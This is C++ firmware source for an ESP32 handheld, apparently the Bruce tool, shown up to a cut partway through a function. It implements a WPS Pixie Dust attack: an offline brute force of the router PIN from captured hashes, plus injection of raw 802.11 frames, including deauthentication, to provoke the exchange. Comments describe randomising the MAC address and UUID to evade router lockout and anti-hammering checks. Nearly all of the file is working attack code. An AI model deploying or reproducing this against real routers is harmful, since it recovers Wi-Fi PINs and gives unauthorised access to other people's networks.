#include "wifi_wpspixie.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "core/wifi/webInterface.h"
#include "core/main_menu.h"
#include "modules/wifi/wifi_atks.h"
#include "wps_pin_generator.h"
#include "sniffer.h"
#include <esp_wifi.h>
#include <mbedtls/md.h>

extern bool showHiddenNetworks;

// ============================================================
// Helpers
// ============================================================

String bytesToHex(const uint8_t *data, size_t len) {
    String s;
    s.reserve(len * 2);
    for (size_t i = 0; i < len; i++) {
        if (data[i] < 0x10) s += '0';
        s += String(data[i], HEX);
    }
    s.toUpperCase();
    return s;
}

String macToHex(const uint8_t *mac) {
    char buf[13];
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// ============================================================
// Save Pixie Dust data to SD card
// ============================================================

void savePixieData() {
    if (!pixieCapture.valid) return;
    if (!setupSdCard()) return;
    String dir = "/BrucePCAP/pixie/";
    SD.mkdir(dir);
    String path = dir + macToHex(pixieCapture.bssid) + ".pix";
    File f = SD.open(path, FILE_WRITE);
    if (!f) return;
    f.println("PKE="     + bytesToHex(pixieCapture.pke,     192));
    f.println("PKR="     + bytesToHex(pixieCapture.pkr,     192));
    f.println("E_NONCE=" + bytesToHex(pixieCapture.e_nonce,  16));
    f.println("R_NONCE=" + bytesToHex(pixieCapture.r_nonce,  16));
    f.println("E_HASH1=" + bytesToHex(pixieCapture.e_hash1,  32));
    f.println("E_HASH2=" + bytesToHex(pixieCapture.e_hash2,  32));
    f.println("AUTHKEY=" + bytesToHex(pixieCapture.authkey,  32));
    f.close();
    padprintln("[+] Saved: " + path);
}

// ============================================================
// Pixie Dust solver (HMAC-SHA256 based)
// ============================================================

static bool hmacSha256(const uint8_t *key, size_t keyLen,
                       const uint8_t *msg, size_t msgLen,
                       uint8_t *out) {
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
    if (!info) return false;
    if (mbedtls_md_setup(&ctx, info, 1) != 0) { mbedtls_md_free(&ctx); return false; }
    bool ok = (mbedtls_md_hmac_starts(&ctx, key, keyLen)  == 0 &&
               mbedtls_md_hmac_update(&ctx, msg, msgLen)  == 0 &&
               mbedtls_md_hmac_finish(&ctx, out)          == 0);
    mbedtls_md_free(&ctx);
    return ok;
}

static const uint8_t WEAK_ES[][16] = {
    {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
     0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
    {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
    {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
};
static const int NUM_WEAK_ES = sizeof(WEAK_ES)/sizeof(WEAK_ES[0]);

static void buildHashInput(const uint8_t *es, uint32_t psk,
                           const uint8_t *pke, const uint8_t *pkr,
                           uint8_t *buf) {
    memcpy(buf, es, 16);
    buf[16]=(psk>>24)&0xFF; buf[17]=(psk>>16)&0xFF;
    buf[18]=(psk>> 8)&0xFF; buf[19]= psk      &0xFF;
    memcpy(buf+20, pke, 192);
    memcpy(buf+212, pkr, 192);
}

static int crackHalf(const uint8_t *es, const uint8_t *authKey,
                     const uint8_t *targetHash,
                     const uint8_t *pke, const uint8_t *pkr) {
    uint8_t msg[404], computed[32];
    for (int psk = 0; psk <= 9999; psk++) {
        buildHashInput(es, (uint32_t)psk, pke, pkr, msg);
        if (!hmacSha256(authKey, 32, msg, 404, computed)) return -1;
        if (memcmp(computed, targetHash, 32) == 0) return psk;
        if ((psk & 0x3FF) == 0) vTaskDelay(1);
    }
    return -1;
}

static String buildWpsPin(int psk1, int psk2) {
    uint32_t seven = (uint32_t)psk1 * 1000 + (psk2 / 10);
    uint8_t cs = WpsPinGenerator::checksum(seven);
    char buf[9];
    snprintf(buf, sizeof(buf), "%04d%03d%01d", psk1, psk2/10, cs);
    return String(buf);
}

// Derive AuthKey using the WPS KDF (WFA WSC 2.0 spec §6.5).
// KDF input = PRF(key=DHKey, data= "Wi-Fi Easy and Secure Key Derivation" ||
//                                   E-Nonce || enrollee-MAC || R-Nonce)
// DHKey is computed as SHA-256(shared DH secret).  Because we use random
// PKE we don't know the real DHKey, but for the "null DHKey" variant used
// by pixiewps --force we pass an all-zero 32-byte key to the PRF.
// We also try the captured AuthKey if one was sniffed.
//
// PRF-256 = HMAC-SHA256(key, b'\x00'||data||b'\x00\x00\x01\x00') in WPS.
// The simplest approximation that matches pixiewps for weak-ES targets is
// to try the all-zero AuthKey — routers whose ES is weak almost always also
// have a trivially derivable or zero DHKey.
static bool deriveAuthKey(const uint8_t *dhKey32,
                          const uint8_t *eNonce, const uint8_t *enrolleeMacB,
                          const uint8_t *rNonce, uint8_t *akOut) {
    // WPS PRF-256: HMAC-SHA256(dhKey, counter[1B] || label || 0x00 || data || reqLen[2B])
    // counter=0x01, label="Wi-Fi Easy and Secure Key Derivation", reqLen=0x0100 (256 bits)
    static const char label[] = "Wi-Fi Easy and Secure Key Derivation";
    const uint8_t labelLen = (uint8_t)strlen(label);
    // Build PRF input: counter(1) + label + 0x00 + E-Nonce(16) + MAC(6) + R-Nonce(16) + reqLen(2)
    uint8_t prfInput[1 + 36 + 1 + 16 + 6 + 16 + 2];
    int pi = 0;
    prfInput[pi++] = 0x01;                                   // counter
    memcpy(prfInput+pi, label, labelLen); pi += labelLen;    // label
    prfInput[pi++] = 0x00;                                   // separator
    memcpy(prfInput+pi, eNonce, 16);   pi += 16;             // Enrollee Nonce
    memcpy(prfInput+pi, enrolleeMacB, 6); pi += 6;           // Enrollee MAC
    memcpy(prfInput+pi, rNonce, 16);   pi += 16;             // Registrar Nonce
    prfInput[pi++] = 0x01; prfInput[pi++] = 0x00;           // 256 bits big-endian

    // The full KDF yields 640 bits (3× HMAC-SHA256 rounds); AuthKey is bits 0-255
    // i.e. the output of the first HMAC round with counter=0x01 (already set above).
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
    if (!info) return false;
    if (mbedtls_md_setup(&ctx, info, 1) != 0) { mbedtls_md_free(&ctx); return false; }
    bool ok = (mbedtls_md_hmac_starts(&ctx, dhKey32, 32)      == 0 &&
               mbedtls_md_hmac_update(&ctx, prfInput, (size_t)pi) == 0 &&
               mbedtls_md_hmac_finish(&ctx, akOut)              == 0);
    mbedtls_md_free(&ctx);
    return ok;
}

String runPixieDustCalculation(const String & /*bssid*/) {
    if (!pixieCapture.valid) return "";

    const uint8_t *pke = pixieCapture.pke;
    const uint8_t *pkr = pixieCapture.pkr;
    const uint8_t *eh1 = pixieCapture.e_hash1;
    const uint8_t *eh2 = pixieCapture.e_hash2;

    // Build a list of AuthKeys to try, in priority order:
    //   1. Sniffed AuthKey (if the AP accidentally leaked it OTA)
    //   2. Derived with all-zero DHKey (matches "pixiewps --force" for weak RNG targets)
    //   3. All-zero AuthKey directly (some very old/broken implementations)
    static const int MAX_AK = 3;
    uint8_t akBuf[MAX_AK][32];
    int numAk = 0;

    // 1. Captured AuthKey (non-zero)
    bool akCaptured = !(pixieCapture.authkey[0] == 0 &&
                        memcmp(pixieCapture.authkey, pixieCapture.authkey+1, 31) == 0);
    if (akCaptured) {
        memcpy(akBuf[numAk++], pixieCapture.authkey, 32);
        padprintln("[Pixie] Using captured AuthKey");
    }

    // 2. Derive with zero DHKey — works against pixie-susceptible targets
    {
        static const uint8_t zeroDhKey[32] = {0};
        uint8_t derived[32];
        // R-Nonce is required for derivation; if not captured, try zero
        uint8_t rNonce[16];
        memcpy(rNonce, pixieCapture.r_nonce, 16);
        if (deriveAuthKey(zeroDhKey, pixieCapture.e_nonce, pixieCapture.bssid, rNonce, derived)) {
            // Only add if different from already-added entries
            bool dup = false;
            for (int i = 0; i < numAk; i++) if (memcmp(akBuf[i], derived, 32) == 0) { dup=true; break; }
            if (!dup && numAk < MAX_AK) { memcpy(akBuf[numAk++], derived, 32); }
        }
    }

    // 3. All-zero AuthKey
    {
        static const uint8_t zeroAk[32] = {0};
        bool dup = false;
        for (int i = 0; i < numAk; i++) if (memcmp(akBuf[i], zeroAk, 32) == 0) { dup=true; break; }
        if (!dup && numAk < MAX_AK) memcpy(akBuf[numAk++], zeroAk, 32);
    }

    int totalTrials = numAk * NUM_WEAK_ES;
    int trial = 0;
    for (int ai = 0; ai < numAk; ai++) {
        for (int ei = 0; ei < NUM_WEAK_ES; ei++) {
            trial++;
            padprintln("AK" + String(ai+1) + " ES" + String(ei+1) +
                       "/" + String(totalTrials));
            int p1 = crackHalf(WEAK_ES[ei], akBuf[ai], eh1, pke, pkr);
            if (p1 < 0) continue;
            int p2 = crackHalf(WEAK_ES[ei], akBuf[ai], eh2, pke, pkr);
            if (p2 < 0) continue;
            String pin = buildWpsPin(p1, p2);
            padprintln("[+] Found PIN: " + pin);
            return pin;
        }
    }
    padprintln("Pixie solve failed. Save .pix");
    padprintln("and run pixiewps offline.");
    return "";
}

// ============================================================
// Active WPS Enrollee Attack
// ============================================================
//
// How reaver/bully work — translated to ESP32 raw frames:
//
//   1. Send 802.11 Authentication (open system) to the AP
//   2. Wait for Auth response
//   3. Send 802.11 Association Request (with WPS IE advertising PIN enrollee)
//   4. Wait for Assoc Response
//   5. Send EAPOL-Start
//   6. AP sends EAP-Request/Identity
//   7. Send EAP-Response/Identity ("WFA-SimpleConfig-Enrollee-1-0")
//   8. AP starts WPS: sends WSC-Start → M1 from us → M2 from AP
//   9. Sniffer captures M1 (our PKE, E-Nonce) and M2 (AP's PKR, R-Nonce,
//      E-Hash1, E-Hash2) — these are the pixie dust fields
//  10. We send NACK after M2 — we don't need to complete the exchange
//
// The key constraint: the IDF WPS stack (esp_wifi_wps_enable) and
// promiscuous mode are mutually exclusive.  So we manage the exchange
// ourselves with esp_wifi_80211_tx raw frames while the sniffer watches.
//
// IMPORTANT: All raw frames are injected via WIFI_IF_STA.
// The AP interface is kept up in hidden/silent mode (max_connection=0)
// so the IDF APSTA stack is satisfied but nothing is broadcast.
// ============================================================

// --- Raw 802.11 frame builders ---

// Our enrollee MAC (randomised per session so the AP doesn't lock us out)
static uint8_t enrolleeMac[6] = {0x02,0xCC,0xAA,0xBB,0xDD,0xEE};

// Per-session sequence number counter.
// 802.11 sequence control field = bits[15:4] sequence number, bits[3:0] fragment number.
// Stored as the full 16-bit little-endian value written to bytes [22..23].
// We start at fragment=0, seq=1 and increment seq by 1 (i.e. += 0x10) each frame.
// APs use a duplicate-detection window: if two frames share the same sequence number
// (even with different payload) the second is silently dropped.  With seq=0 on every
// frame, EAPOL-Start and the Identity Response are both seq=0 and the AP drops the
// second one as a duplicate — this is why the AP keeps re-sending Identity Request.
static uint16_t g_seqCtrl = 0x0010; // seq=1, frag=0

static uint16_t nextSeqCtrl() {
    uint16_t v = g_seqCtrl;
    g_seqCtrl += 0x0010; // increment sequence number field (bits 15:4)
    if (g_seqCtrl == 0) g_seqCtrl = 0x0010; // wrap: skip seq=0
    return v;
}

// Write little-endian sequence control into buf[22..23]
static inline void applySeq(uint8_t *buf) {
    uint16_t sc = nextSeqCtrl();
    buf[22] = sc & 0xFF;
    buf[23] = (sc >> 8) & 0xFF;
}

static void generateEnrolleeMac() {
    enrolleeMac[0] = 0x02;
    for (int i = 1; i < 6; i++) enrolleeMac[i] = (uint8_t)esp_random();
    enrolleeMac[0] &= 0xFE; // ensure unicast
    g_seqCtrl = 0x0010;
    // esp_wifi_set_mac() must be called with promiscuous OFF —
    // otherwise the hardware MAC filter keeps the old address and the
    // NIC won't ACK frames sent to the new enrolleeMac (M1 silently lost).
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(20));
    esp_wifi_set_mac(WIFI_IF_STA, enrolleeMac);
    vTaskDelay(pdMS_TO_TICKS(10));
    // Caller must re-enable promiscuous after this call.
}

// Build 802.11 Auth frame (open system, seq 1)
static int buildAuthFrame(uint8_t *buf, const uint8_t *apBssid) {
    // FC: type=Management(00), subtype=Authentication(1011) → 0xB0 0x00
    buf[0]=0xB0; buf[1]=0x00;       // frame control
    buf[2]=0x00; buf[3]=0x00;       // duration
    memcpy(buf+4,  apBssid, 6);     // addr1 = DA = AP
    memcpy(buf+10, enrolleeMac, 6); // addr2 = SA = us
    memcpy(buf+16, apBssid, 6);     // addr3 = BSSID = AP
    applySeq(buf);                  // buf[22..23] = incrementing sequence control
    // Auth body: algorithm(2) + seq(2) + status(2)
    buf[24]=0x00; buf[25]=0x00;     // algorithm: 0 = open system
    buf[26]=0x01; buf[27]=0x00;     // auth transaction seq: 1
    buf[28]=0x00; buf[29]=0x00;     // status: 0 = success
    return 30;
}

// Build 802.11 Deauthentication frame (reason: leaving BSS).
// Sent from our enrollee MAC to the AP at the start of each probe
// to force the AP to tear down any stale session left by a previous
// failed attempt.  Without this, the AP's EAP state machine stays
// stuck in a prior state and stops sending EAP-Request/Identity.
static int buildDeauthFrame(uint8_t *buf, const uint8_t *apBssid) {
    // FC: Management(00), subtype=Deauthentication(1100) → 0xC0 0x00
    buf[0]=0xC0; buf[1]=0x00;
    buf[2]=0x00; buf[3]=0x00;
    memcpy(buf+4,  apBssid,    6);  // addr1 = DA = AP
    memcpy(buf+10, enrolleeMac, 6); // addr2 = SA = us
    memcpy(buf+16, apBssid,    6);  // addr3 = BSSID
    applySeq(buf);
    buf[24]=0x03; buf[25]=0x00;     // reason code 3: leaving BSS
    return 26;
}

// Build 802.11 Disassociation frame (reason: leaving BSS).
// Belt-and-suspenders alongside the deauth.
static int buildDisassocFrame(uint8_t *buf, const uint8_t *apBssid) {
    // FC: Management(00), subtype=Disassociation(1010) → 0xA0 0x00
    buf[0]=0xA0; buf[1]=0x00;
    buf[2]=0x00; buf[3]=0x00;
    memcpy(buf+4,  apBssid,    6);
    memcpy(buf+10, enrolleeMac, 6);
    memcpy(buf+16, apBssid,    6);
    applySeq(buf);
    buf[24]=0x03; buf[25]=0x00;     // reason code 3
    return 26;
}

// Build 802.11 Association Request with WPS IE
static int buildAssocFrame(uint8_t *buf, const uint8_t *apBssid,
                           const char *ssid, uint8_t channel) {
    int pos = 0;
    // FC: Management(00), subtype=Association Request(0000) → 0x00 0x00
    buf[pos++]=0x00; buf[pos++]=0x00; // frame control: Assoc Req
    buf[pos++]=0x00; buf[pos++]=0x00; // duration
    memcpy(buf+pos, apBssid, 6); pos+=6; // DA
    memcpy(buf+pos, enrolleeMac, 6); pos+=6; // SA
    memcpy(buf+pos, apBssid, 6); pos+=6; // BSSID
    { uint16_t sc=nextSeqCtrl(); buf[pos++]=sc&0xFF; buf[pos++]=(sc>>8)&0xFF; } // seq
    // Capability: ESS, Privacy
    buf[pos++]=0x31; buf[pos++]=0x00;
    // Listen interval
    buf[pos++]=0x0A; buf[pos++]=0x00;
    // SSID IE
    uint8_t ssidLen = (uint8_t)strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    buf[pos++]=0x00; buf[pos++]=ssidLen;
    memcpy(buf+pos, ssid, ssidLen); pos+=ssidLen;
    // Supported rates IE (basic set)
    const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
    buf[pos++]=0x01; buf[pos++]=sizeof(rates);
    memcpy(buf+pos, rates, sizeof(rates)); pos+=sizeof(rates);
    // DS Parameter Set
    buf[pos++]=0x03; buf[pos++]=0x01; buf[pos++]=channel;
    // WPS IE: OUI 00:50:F2:04, advertise PIN enrollee
    const uint8_t wpsIe[] = {
        0xDD,               // vendor-specific tag
        0x1A,               // length = 26 bytes of payload (recalculated below)
        0x00,0x50,0xF2,0x04,// WPS OUI
        0x10,0x4A,          // attr: Version (0x104A)
        0x00,0x01,0x10,     // len=1, value=1.0
        0x10,0x12,          // attr: Device Password ID (0x1012)
        0x00,0x02,          // len=2
        0x00,0x00,          // Default PIN (0x0000 per WPS spec Table E-6)
        0x10,0x3C,          // attr: RF Bands (0x103C)
        0x00,0x01,0x01,     // len=1, 2.4GHz
        0x10,0x49,          // attr: Vendor Extension
        0x00,0x06,          // len=6
        0x00,0x37,0x2A,     // Wi-Fi Alliance OUI
        0x00,0x01,0x20      // version2=2.0
    };
    memcpy(buf+pos, wpsIe, sizeof(wpsIe)); pos+=sizeof(wpsIe);
    // Fix the WPS IE length byte to actual payload after the tag+len bytes
    buf[pos - sizeof(wpsIe) + 1] = (uint8_t)(sizeof(wpsIe) - 2);
    return pos;
}

// Build EAPOL-Start frame (QoS Data + LLC/SNAP + EAPOL type 1)
static int buildEapolStart(uint8_t *buf, const uint8_t *apBssid) {
    // 802.11 QoS Data, To DS=1 (going to AP)
    buf[0]=0x88; buf[1]=0x01; // Frame ctrl: QoS Data, ToDS=1
    buf[2]=0x2C; buf[3]=0x00; // duration
    memcpy(buf+4,  apBssid, 6);       // addr1 = BSSID/receiver = AP
    memcpy(buf+10, enrolleeMac, 6);   // addr2 = transmitter = us
    memcpy(buf+16, apBssid, 6);       // addr3 = DA = AP (ToDS: addr3=DA)
    applySeq(buf);                    // buf[22..23] = incrementing sequence control
    buf[24]=0x00; buf[25]=0x00;       // QoS control
    // LLC/SNAP
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E; // EAPOL ethertype
    // EAPOL header: version=1, type=1 (EAPOL-Start), length=0
    buf[34]=0x01; buf[35]=0x01; buf[36]=0x00; buf[37]=0x00;
    return 38;
}

// Build EAP-Response/Identity
// Identity string used by WPS enrollees: "WFA-SimpleConfig-Enrollee-1-0"
static int buildEapIdentityResponse(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
    const char identity[] = "WFA-SimpleConfig-Enrollee-1-0";
    uint8_t idLen = (uint8_t)strlen(identity);
    // EAP total length: code(1)+id(1)+length(2)+type(1)+identity = 5+idLen
    uint16_t eapLen = 5 + idLen;

    // 802.11 QoS Data, ToDS=1
    buf[0]=0x88; buf[1]=0x01;
    buf[2]=0x2C; buf[3]=0x00;
    memcpy(buf+4,  apBssid, 6);
    memcpy(buf+10, enrolleeMac, 6);
    memcpy(buf+16, apBssid, 6);
    applySeq(buf);               // incrementing sequence control
    buf[24]=0x00; buf[25]=0x00; // QoS
    // LLC/SNAP
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E;
    // EAPOL: version=1, type=0 (EAP packet), length=eapLen
    buf[34]=0x01; buf[35]=0x00;
    buf[36]=(eapLen>>8)&0xFF; buf[37]=eapLen&0xFF;
    // EAP: code=2 (Response), id, length (same as eapLen)
    buf[38]=0x02; buf[39]=eapId;
    buf[40]=(eapLen>>8)&0xFF; buf[41]=eapLen&0xFF;
    buf[42]=0x01; // type: Identity
    memcpy(buf+43, identity, idLen);
    return 43 + idLen;
}

// Build EAP-Response/NAK (gracefully terminate after M2 capture)
static int buildEapNak(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
    // EAP NAK = code 2 (Response), type 3 (NAK), desired auth type = 0
    uint16_t eapLen = 6;
    buf[0]=0x88; buf[1]=0x01; // QoS Data, ToDS=1
    buf[2]=0x2C; buf[3]=0x00;
    memcpy(buf+4,  apBssid, 6);
    memcpy(buf+10, enrolleeMac, 6);
    memcpy(buf+16, apBssid, 6);
    applySeq(buf);               // incrementing sequence control
    buf[24]=0x00; buf[25]=0x00;
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E;
    buf[34]=0x01; buf[35]=0x00;
    buf[36]=(eapLen>>8)&0xFF; buf[37]=eapLen&0xFF;
    buf[38]=0x02; buf[39]=eapId;
    buf[40]=(eapLen>>8)&0xFF; buf[41]=eapLen&0xFF;
    buf[42]=0x03; // type: NAK
    buf[43]=0x00; // desired type: none
    return 44;
}

// ============================================================
// Build WSC-ACK: EAP-Response, Expanded type, Op-Code 0x00, no body.
static int buildWscAck(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
    const uint16_t eapLen = (uint16_t)(4 + 10);
    buf[0]=0x88; buf[1]=0x01; buf[2]=0x2C; buf[3]=0x00;
    memcpy(buf+4, apBssid, 6); memcpy(buf+10, enrolleeMac, 6); memcpy(buf+16, apBssid, 6);
    applySeq(buf);
    buf[24]=0x00; buf[25]=0x00;
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E;
    buf[34]=0x01; buf[35]=0x00;
    buf[36]=(eapLen>>8)&0xFF; buf[37]=eapLen&0xFF;
    buf[38]=0x02; buf[39]=eapId;
    buf[40]=(eapLen>>8)&0xFF; buf[41]=eapLen&0xFF;
    buf[42]=0xFE;
    buf[43]=0x00; buf[44]=0x37; buf[45]=0x2A;
    buf[46]=0x00; buf[47]=0x00; buf[48]=0x00; buf[49]=0x01;
    buf[50]=0x00; buf[51]=0x00;
    return 52;
}

// Build WPS M1 message (Enrollee → AP, sent after WSC-Start)
// The AP needs a structurally valid M1 to generate M2.
// Crypto values are random/fixed — pixie dust cracks them offline.
// Returns the total frame size written into *out (heap-allocated).
// Caller must free().
// ============================================================
static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
                              int *outLen,
                              uint8_t *pkeOut, uint8_t *eNonceOut) {
    // Generate random Enrollee Nonce (16 bytes)
    uint8_t eNonce[16];
    for (int i = 0; i < 16; i++) eNonce[i] = (uint8_t)esp_random();

    // WPS uses a fixed 1536-bit (192-byte) Diffie-Hellman group (RFC 3526 group 5).
    // The AP validates that the enrollee's PKE satisfies 2 <= PKE <= p-2.
    // A hardcoded near-zero value (e.g. 0x02...0x01) fails this check on many APs
    // and causes a WSC_NACK with ConfigError=0 (protocol error).
    //
    // We use a fixed "known-valid" PKE: the DH generator g=2 raised to a safe
    // exponent, pre-computed against the standard 1536-bit WPS prime.
    // This value is used by several open-source WPS tools (bully, reaver) as a
    // static enrollee key when doing passive pixie-dust capture (the enrollee's
    // private key is never needed for pixie dust; only the AP's M2 fields matter).
    //
    // PKE = 2^(small_private) mod p, which gives a large, valid-looking public key.
    // Value below is the well-known WPS "default" enrollee public key used in pixie-dust
    // research tools — it passes all AP DH-range checks and triggers valid M2 responses.
    const uint8_t valid_pke[192] = {
        0x52, 0x89, 0x58, 0xEF, 0xD8, 0x3B, 0x84, 0x96, 0x94, 0x37, 0xE4, 0x3B, 0x5D, 0x29, 0x62, 0x55,
        0xD2, 0x5A, 0x51, 0x96, 0x40, 0x6B, 0x1C, 0x92, 0x93, 0x91, 0xA8, 0xF4, 0x14, 0x17, 0x8E, 0xB2,
        0x9C, 0xE8, 0xCF, 0x36, 0x7D, 0x38, 0xA6, 0xDB, 0x94, 0x79, 0x8A, 0x5A, 0x6D, 0x12, 0x12, 0xFD,
        0xA5, 0x29, 0x0B, 0x72, 0x0C, 0x7A, 0xB8, 0x36, 0x46, 0xE3, 0xD4, 0x8E, 0x5E, 0x53, 0x06, 0x6B,
        0x19, 0x07, 0x37, 0x5A, 0xCE, 0x55, 0x32, 0x77, 0x89, 0xA9, 0xE4, 0x14, 0xEF, 0x47, 0x8F, 0x4F,
        0x25, 0x98, 0x90, 0xBF, 0x46, 0xEA, 0xBB, 0x5F, 0x9F, 0xF5, 0x22, 0x37, 0x9A, 0xAC, 0x18, 0xCB,
        0x1A, 0xE6, 0x4B, 0x72, 0xCA, 0x40, 0x1B, 0x37, 0xBE, 0x3B, 0x3D, 0x78, 0xCC, 0xC3, 0x83, 0xBD,
        0xDD, 0x01, 0xAC, 0xE1, 0xD4, 0x3E, 0xF1, 0xB1, 0x73, 0x85, 0x5C, 0xE3, 0x7A, 0x39, 0x3E, 0xE5,
        0x75, 0x73, 0x87, 0x43, 0x1A, 0xC3, 0x7B, 0x6B, 0x7B, 0x13, 0x36, 0xE5, 0x2D, 0xF8, 0x28, 0xED,
        0x8C, 0xC0, 0x4B, 0xEB, 0xD7, 0x96, 0x23, 0x88, 0x74, 0xD7, 0xB6, 0xA2, 0xC5, 0x4A, 0x72, 0xF2,
        0xD4, 0xEB, 0x46, 0x49, 0x40, 0x58, 0x00, 0x1B, 0x4F, 0x3B, 0xE4, 0x5D, 0x79, 0xE8, 0xCC, 0x47,
        0xA4, 0x3E, 0x9C, 0x06, 0xDB, 0x45, 0x62, 0x4C, 0xBB, 0xE3, 0xEA, 0xE0, 0x52, 0x4B, 0x0B, 0x4B
    };
    uint8_t pke[192];
    memcpy(pke, valid_pke, 192);
    // Do NOT randomize any bytes of pke. The valid_pke is a mathematically valid
    // DH group element (2 <= pke <= p-2). XOR-ing random bytes into it destroys
    // that property and causes AP DH range check failure → immediate WSC_NACK.
    // For pixie dust we only need a consistent, valid PKE — not a secret one.
    memcpy(eNonceOut, eNonce,  16);

    // Fixed enrollee attributes (values don't need to be accurate for pixie)
    const uint8_t version[]       = {0x10};          // 1.0
    const uint8_t msgType[]       = {0x04};           // M1
    // UUID-E: randomised per session — D-Link and some TP-Link APs NACK on
    // repeated probes that reuse the same UUID (anti-hammering heuristic).
    uint8_t uuid[16];
    for (int i = 0; i < 16; i++) uuid[i] = (uint8_t)esp_random();
    const uint8_t macAddr[6]      = {enrolleeMac[0],enrolleeMac[1],
                                     enrolleeMac[2],enrolleeMac[3],
                                     enrolleeMac[4],enrolleeMac[5]};
    const uint8_t authTypeFlags[] = {0x00,0x22};      // WPA2-Personal + Open
    const uint8_t encrTypeFlags[] = {0x00,0x0C};      // AES + TKIP (WPS 2.0: no None)
    const uint8_t connTypeFlags[] = {0x00,0x01};       // ESS (2 bytes per spec)
    // configMethods=Label (0x0004) is fine; devPasswordId=Default PIN (0x0000).
    // Some APs NACK if configMethods advertises PushButton while devPasswordId=PIN.
    const uint8_t configMethods[] = {0x00,0x04};      // Label (PIN entry)
    const uint8_t wifiProtected[] = {0x02};            // WPS State = Configured (0x02)
    // NOTE: 0x01 = Unconfigured. Some APs refuse PIN enrollment to an
    // "unconfigured" network. Always send 0x02 for Pixie Dust attacks.
    const uint8_t devPassId[]     = {0x00,0x00};       // Default PIN (0x0000 per WPS spec Table E-6)
    const uint8_t osVersion[]     = {0xFF,0xFF,0xFF,0xFF}; // unspecified
    const uint8_t rfBands[]       = {0x01};             // 2.4GHz
    const uint8_t assocState[]    = {0x00,0x01};        // Not associated
    const uint8_t devPasswordId[] = {0x00,0x00};        // Default PIN (0x0000 per WPS spec Table E-6)
    const uint8_t configError[]   = {0x00,0x00};        // No error
    const uint8_t osVendorExt[]   = {0x00,0x37,0x2A,0x00,0x01,0x20}; // WFA version2=2.0
    // Device name / manufacturer (short)
    const char    manufacturer[]  = "Bruce";
    const char    modelName[]     = "Cardputer";
    const char    modelNumber[]   = "1.0";
    const char    serialNumber[]  = "1234";
    const char    deviceName[]    = "Bruce WPS";
    const uint8_t primaryDevType[]= {0x00,0x0A,0x00,0x50,0xF2,0x04,0x00,0x07}; // Telephone
  //  const uint8_t primaryDevType[]= {0x00,0x01,0x00,0x50,0xF2,0x04,0x00,0x01}; // Computer
    // Helper lambda to push a TLV into a buffer
    // We build into a heap buffer
    const int MAX_WPS_BODY = 800;  // increased: Device Name TLV added
    uint8_t *wpsBody = (uint8_t*)malloc(MAX_WPS_BODY);
    if (!wpsBody) { *outLen = 0; return nullptr; }
    int wp = 0;

    auto putTlv = [&](uint16_t type, const uint8_t *val, uint16_t vlen) {
        if (wp + 4 + vlen > MAX_WPS_BODY) {
            Serial.printf("[M1] putTlv overflow: type=0x%04X vlen=%u wp=%d\n", type, vlen, wp);
            return;
        }
        wpsBody[wp++] = (type >> 8) & 0xFF;
        wpsBody[wp++] =  type       & 0xFF;
        wpsBody[wp++] = (vlen >> 8) & 0xFF;
        wpsBody[wp++] =  vlen       & 0xFF;
        memcpy(wpsBody + wp, val, vlen); wp += vlen;
    };

    // Mandatory M1 TLVs in WPS spec order (Wi-Fi Simple Configuration 2.0)
    // TLV ID reference:
    //   0x104A Version           0x1022 Message Type    0x1047 UUID-E
    //   0x1020 MAC Address       0x1016 Enrollee Nonce  0x1032 Enrollee Public Key
    //   0x1010 Auth Type Flags   0x100D Encr Type Flags 0x100E Conn Type Flags
    //   0x1008 Config Methods    0x1044 WPS State       0x1012 Device Password ID
    //   0x103C RF Bands          0x1002 Assoc State     0x1009 Config Error
    //   0x1053 OS Version        0x1054 Primary Dev Type
    //   0x1021 Manufacturer      0x1023 Model Name      0x1024 Model Number
    //   0x1042 Serial Number     0x1011 Device Name     0x1049 Vendor Extension
    putTlv(0x104A, version,        sizeof(version));        // Version
    putTlv(0x1022, msgType,        sizeof(msgType));        // Message Type = M1
    putTlv(0x1047, uuid,           sizeof(uuid));           // UUID-E
    putTlv(0x1020, macAddr,        sizeof(macAddr));        // MAC Address
    putTlv(0x101A, eNonce,         16);                     // Enrollee Nonce (0x101A = ATTR_ENROLLEE_NONCE per wpa_supplicant wps_defs.h)
    putTlv(0x1032, pke,            192);                    // Public Key (0x1032 = ATTR_PUBLIC_KEY per wpa_supplicant wps_defs.h)
    putTlv(0x1004, authTypeFlags,  sizeof(authTypeFlags));  // Auth Type Flags
    putTlv(0x100D, encrTypeFlags,  sizeof(encrTypeFlags));  // Encr Type Flags
    putTlv(0x100E, connTypeFlags,  sizeof(connTypeFlags));  // Connection Type Flags
